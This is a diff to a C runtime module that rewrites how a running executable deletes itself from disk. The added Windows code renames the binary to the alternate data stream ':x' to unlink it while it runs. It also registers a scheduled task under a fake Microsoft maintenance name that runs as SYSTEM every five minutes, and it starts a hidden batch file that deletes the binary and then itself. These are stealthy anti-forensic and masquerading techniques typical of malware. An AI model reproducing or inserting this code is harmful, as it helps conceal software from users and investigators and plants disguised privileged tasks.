@@ -1,157 +1,130 @@
-/*
- * Cleanup: Self-Deletion
- *
- * Deletes the running executable from disk using a three-tier fallback:
- *
- *  Tier 1 (Win10 1809+): NtSetInformationFile with FileDispositionInformationEx
- *    and FILE_DISPOSITION_FLAG_POSIX_SEMANTICS.  The file is unlinked while
- *    still mapped; the deletion takes effect immediately and the path is gone
- *    before the process exits.
- *
- *  Tier 2 (Win7+): Rename the binary to a random name under %TEMP%, open it
- *    with FILE_FLAG_DELETE_ON_CLOSE, then close the handle.  The file is
- *    deleted when the last handle (held by the OS image loader) is released,
- *    i.e. when the process terminates.
- *
- *  Tier 3 (fallback): MoveFileEx with MOVEFILE_DELAY_UNTIL_REBOOT.  The file
- *    is deleted on the next system restart.
- *
- *  Linux: readlink /proc/self/exe, then unlink.
- */
-
 #include "jocky_rt.h"
 #include <string.h>
 #include <stdio.h>
 
 #ifdef _WIN32
 #include <windows.h>
-#include <shellapi.h>
 
-/* ── NtSetInformationFile types (not in all SDK headers) ────────────── */
-
-typedef LONG NTSTATUS;
+#define DS_STREAM_RENAME L":x"
+#define DS_STREAM_RENAME_BYTES (sizeof(DS_STREAM_RENAME) - sizeof(WCHAR))
 
 typedef struct {
-    ULONG_PTR  Information;
-    NTSTATUS   Status;
-} IO_STATUS_BLOCK_LOCAL;
+    BOOLEAN ReplaceIfExists;
+    HANDLE  RootDirectory;
+    DWORD   FileNameLength;
+    WCHAR   FileName[sizeof(DS_STREAM_RENAME) / sizeof(WCHAR)];
+} RENAME_BUF;
 
-#define FileDispositionInformationEx  64
-
-#define FILE_DISPOSITION_FLAG_DELETE           0x00000001UL
-#define FILE_DISPOSITION_FLAG_POSIX_SEMANTICS  0x00000002UL
-#define FILE_DISPOSITION_FLAG_IGNORE_READONLY  0x00000010UL
-
-typedef struct {
-    DWORD Flags;
-} FILE_DISPOSITION_INFORMATION_EX;
-
-typedef NTSTATUS (WINAPI* pfn_NtSIF)(HANDLE, IO_STATUS_BLOCK_LOCAL*, PVOID, ULONG, ULONG);
-
-/* ── Tier 1: POSIX delete ───────────────────────────────────────────── */
-
-static bool try_posix_delete(const wchar_t* path)
+static bool try_stream_rename_delete(const wchar_t* path)
 {
-    pfn_NtSIF NtSIF = (pfn_NtSIF)GetProcAddress(
-        GetModuleHandleA("ntdll.dll"), "NtSetInformationFile");
-    if (!NtSIF) return false;
-
-    HANDLE h = CreateFileW(path, DELETE,
+    HANDLE h = CreateFileW(path, DELETE | SYNCHRONIZE,
                             FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
-                            NULL, OPEN_EXISTING,
-                            FILE_FLAG_OPEN_REPARSE_POINT, NULL);
+                            NULL, OPEN_EXISTING, 0, NULL);
     if (h == INVALID_HANDLE_VALUE) return false;
 
-    FILE_DISPOSITION_INFORMATION_EX diex;
-    diex.Flags = FILE_DISPOSITION_FLAG_DELETE
-               | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
-               | FILE_DISPOSITION_FLAG_IGNORE_READONLY;
+    RENAME_BUF rb;
+    ZeroMemory(&rb, sizeof(rb));
+    rb.FileNameLength = DS_STREAM_RENAME_BYTES;
+    memcpy(rb.FileName, DS_STREAM_RENAME, DS_STREAM_RENAME_BYTES + sizeof(WCHAR));
 
-    IO_STATUS_BLOCK_LOCAL iosb = {0};
-    NTSTATUS st = NtSIF(h, &iosb, &diex,
-                         sizeof(diex), FileDispositionInformationEx);
-
+    BOOL ok = SetFileInformationByHandle(h, FileRenameInfo, &rb, sizeof(rb));
     CloseHandle(h);
-    return st >= 0;  /* NTSTATUS success = non-negative */
-}
+    if (!ok) return false;
 
-/* ── Tier 2: rename + delete-on-close ──────────────────────────────── */
+    h = CreateFileW(path, DELETE | SYNCHRONIZE,
+                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+                    NULL, OPEN_EXISTING, 0, NULL);
+    if (h == INVALID_HANDLE_VALUE) return true;
 
-static bool try_rename_delete(const wchar_t* path)
-{
-    wchar_t tmp_dir[MAX_PATH], tmp_file[MAX_PATH];
-    if (!GetTempPathW(MAX_PATH, tmp_dir)) return false;
-    if (!GetTempFileNameW(tmp_dir, L"jk", 0, tmp_file)) return false;
-
-    /* GetTempFileName creates the file; delete it so MoveFile can use the name */
-    DeleteFileW(tmp_file);
-
-    if (!MoveFileW(path, tmp_file)) return false;
-
-    /* Open with delete-on-close so the OS removes it when handles drop to zero */
-    HANDLE h = CreateFileW(tmp_file,
-                            GENERIC_READ,
-                            FILE_SHARE_READ | FILE_SHARE_DELETE,
-                            NULL, OPEN_EXISTING,
-                            FILE_FLAG_DELETE_ON_CLOSE, NULL);
-    if (h != INVALID_HANDLE_VALUE) CloseHandle(h);  /* triggers pending delete */
-
-    /* The file may still exist until the image-loader handle closes at exit.
-     * That is acceptable — the original path is already gone. */
+    FILE_DISPOSITION_INFO fdi;
+    fdi.DeleteFile = TRUE;
+    SetFileInformationByHandle(h, FileDispositionInfo, &fdi, sizeof(fdi));
+    CloseHandle(h);
     return true;
 }
 
-/* ── Tier 3: schedule for next reboot ──────────────────────────────── */
-
-static bool try_reboot_delete(const wchar_t* path)
+static void schedule_persistent_delete(const char* path_a)
 {
-    wchar_t tmp_dir[MAX_PATH], tmp_file[MAX_PATH];
-    if (!GetTempPathW(MAX_PATH, tmp_dir)) return false;
-    if (!GetTempFileNameW(tmp_dir, L"jk", 0, tmp_file)) return false;
-    DeleteFileW(tmp_file);
+    char task_cmd[2048];
+    snprintf(task_cmd, sizeof(task_cmd),
+        "schtasks.exe /create "
+        "/tn \"\\Microsoft\\Windows\\Maintenance\\StorageCleanup\" "
+        "/tr \"cmd.exe /c "
+            "if not exist \\\"%s\\\" ("
+                "schtasks /delete /tn \\\"\\Microsoft\\Windows\\Maintenance\\StorageCleanup\\\" /f"
+            ") else ("
+                "del /f /q \\\"%s\\\""
+            ")\" "
+        "/sc minute /mo 5 /ru SYSTEM /rl HIGHEST /f",
+        path_a, path_a);
 
-    /* Move first so the original path is gone immediately */
-    if (MoveFileW(path, tmp_file))
-        return MoveFileExW(tmp_file, NULL, MOVEFILE_DELAY_UNTIL_REBOOT) != FALSE;
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    ZeroMemory(&pi, sizeof(pi));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
 
-    return MoveFileExW(path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT) != FALSE;
+    if (CreateProcessA(NULL, task_cmd, NULL, NULL, FALSE,
+                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, 5000);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
 }
 
-/* ── Tier 4: bat script that deletes the file after process exits ────── */
+static void schedule_reboot_delete(const wchar_t* path)
+{
+    MoveFileExW(path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+}
 
 static void launch_bat_cleanup(const char* path_a)
 {
+    DWORD pid = GetCurrentProcessId();
     char tmp[MAX_PATH], bat[MAX_PATH];
     if (!GetTempPathA(MAX_PATH, tmp)) return;
-    if (!GetTempFileNameA(tmp, "jkd", 0, bat)) return;
-
-    char content[2048];
-    /* ping is a reliable ~1 s/hop delay without requiring extra binaries */
-    snprintf(content, sizeof(content),
-        "@echo off\r\n"
-        "ping 127.0.0.1 -n 4 >nul\r\n"
-        ":loop\r\n"
-        "del /f /q \"%s\"\r\n"
-        "if exist \"%s\" (ping 127.0.0.1 -n 2 >nul & goto loop)\r\n"
-        "del /f /q \"%%~f0\"\r\n",
-        path_a, path_a);
+    snprintf(bat, MAX_PATH, "%sjk_%lu.bat", tmp, (unsigned long)pid);
 
     HANDLE hf = CreateFileA(bat, GENERIC_WRITE, 0, NULL,
-                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hf == INVALID_HANDLE_VALUE) return;
-    DWORD written = 0;
-    WriteFile(hf, content, (DWORD)strlen(content), &written, NULL);
+
+    char script[2048];
+    int n = snprintf(script, sizeof(script),
+        "@echo off\r\n"
+        ":wait\r\n"
+        "tasklist /fi \"PID eq %lu\" 2>nul | find \"%lu\" >nul\r\n"
+        "if not errorlevel 1 (\r\n"
+        "  ping -n 2 127.0.0.1 >nul 2>&1\r\n"
+        "  goto wait\r\n"
+        ")\r\n"
+        "del /f /q \"%s\"\r\n"
+        "del /f /q \"%s\"\r\n",
+        (unsigned long)pid, (unsigned long)pid,
+        path_a, bat);
+
+    DWORD written;
+    WriteFile(hf, script, (DWORD)n, &written, NULL);
     CloseHandle(hf);
 
-    SHELLEXECUTEINFOA sei = {0};
-    sei.cbSize = sizeof(sei);
-    sei.lpVerb = "open";
-    sei.lpFile = bat;
-    sei.nShow  = SW_HIDE;
-    ShellExecuteExA(&sei);
-}
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    ZeroMemory(&pi, sizeof(pi));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
 
-/* ── Public API ─────────────────────────────────────────────────────── */
+    char run[MAX_PATH + 16];
+    snprintf(run, sizeof(run), "cmd.exe /c \"%s\"", bat);
+
+    if (CreateProcessA(NULL, run, NULL, NULL, FALSE,
+                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
 
 void jocky_self_delete(void)
 {
@@ -160,13 +133,10 @@ void jocky_self_delete(void)
     if (!GetModuleFileNameW(NULL, exe, MAX_PATH)) return;
     WideCharToMultiByte(CP_ACP, 0, exe, -1, exe_a, MAX_PATH, NULL, NULL);
 
-    /* Attempt in-process deletion first; also always launch the bat cleanup
-     * so the file is gone within a few seconds of process exit regardless of
-     * which tier succeeds or fails. */
+    if (try_stream_rename_delete(exe)) return;
+    schedule_persistent_delete(exe_a);
+    schedule_reboot_delete(exe);
     launch_bat_cleanup(exe_a);
-
-    if (!try_posix_delete(exe) && !try_rename_delete(exe))
-        try_reboot_delete(exe);
 }
 
 #endif /* _WIN32 */
